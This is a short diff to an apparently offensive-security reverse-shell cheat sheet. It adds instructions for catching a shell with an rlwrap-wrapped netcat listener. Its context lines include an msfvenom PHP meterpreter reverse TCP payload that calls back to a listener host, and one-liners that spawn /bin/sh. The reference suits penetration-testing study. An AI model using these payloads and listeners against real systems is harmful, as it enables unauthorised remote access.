@@ -280,7 +280,13 @@ $ msfvenom -p php/meterpreter_reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f raw
 
 ## Spawn TTY Shell
 
-Access shortcuts, su, nano and autocomplete in a partially tty shell
+In order to catch a shell, you need to listen on the desired port. `rlwrap` will enhance the shell, allowing you to clear the screen with `[CTRL] + [L]`.
+
+```powershell
+rlwrap nc localhost 80
+```
+
+Sometimes, you want to access shortcuts, su, nano and autocomplete in a partially tty shell.
 
 :warning: OhMyZSH might break this trick, a simple `sh` is recommended
 
@@ -319,6 +325,7 @@ perl: exec "/bin/sh";
 ruby: exec "/bin/sh"
 lua: os.execute('/bin/sh')
 ```
+
 
 
 ## References
